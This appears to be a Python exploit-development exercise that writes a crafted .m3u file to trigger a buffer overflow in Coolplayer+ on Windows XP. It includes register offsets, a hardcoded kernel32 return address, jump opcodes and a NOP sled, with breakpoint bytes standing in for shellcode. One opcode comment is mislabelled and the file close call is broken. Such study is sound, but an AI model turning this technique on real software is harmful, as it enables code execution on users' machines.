#!/usr/bin/python

# Author: Michael Music
# Date: 8/1/2019
# Description: Coolplayer+ Buffer Overflow Exploit
#  Exercise in BOFs following the securitysift guide
#  Tested on Windows XP
# Notes:
#  I will be assuming that EBX and ESP points to the buffer.
#  This scenario assumes that EBX only has 100 bytes of uninterrupted space.
#   As such, I will need to use the sub reg, jmp method.
#  Since EBX points to the very beginning of the buffer, EIP is at offset 260, ESP at offset 264
#   I will need to put a JMP EBX address in EIP, then have JMP code in the beginning
#   of the buffer.
#  The custom JMP code will subtract bytes to the address in the ESP register, then jump to it.
#   This would end up be something like sub [ESP], 240 + jmp ESP
#  App must be installed, launched at C:/
#  m3u file must be located at C:/

# EIP at offset 260
# ESP at offset 264
# EDX at offset 0
# EBX at offset 0
# There is only around 250 bytes worth of spaces at ESP, so it's limited
# I am assuming EBX only has 100 bytes of space for this scenario
# Solution is to JMP EBX, launch custom JMP code to subtract 240 from ESP, JMP ESP
# Exploit: [Custom JMP code - jump to ESP][NOPs][Shellcode][EIP - JMP EBX][Junk]
# Found a JMP EBX at 0x7c873c53 in kernel32.dll

exploit_string = ''

# Start of buffer, contains JMP code to subtract 240 from ESP
exploit_string += '\x83\xec\x64' * 2
exploit_string += '\x83\xec\x28'

# JMP EBX
exploit_string += '\xff\xe4'

# NOPs
exploit_string += '\x90' * 30

# Shellcode
exploit_string += '\xcc' * (260 - len(exploit_string))

# EIP, which should be an address for JMP EBX
exploit_string += '\x53\x3c\x87\x7c'

# Filler to cause the overflow
exploit_string += '\x43' * (10000 - len(exploit_string))

out = 'crash.m3u'

text = open(out, 'w')
text.write(exploit_string)
text.close
